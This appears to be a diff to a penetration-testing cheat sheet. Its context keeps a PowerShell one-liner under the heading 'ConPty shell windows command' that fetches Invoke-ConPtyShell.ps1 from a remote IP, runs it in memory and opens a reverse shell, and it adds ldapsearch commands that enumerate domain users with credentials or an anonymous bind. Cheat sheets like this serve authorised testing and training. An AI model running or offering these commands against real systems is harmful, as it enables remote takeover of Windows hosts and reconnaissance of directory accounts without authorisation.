@@ -3499,3 +3499,10 @@ ConPty shell windows command
 ```
 IEX(IWR http://192.168.45.184/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 443
 ```
+
+LDAP access
+```
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '' -w '' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+```
+```
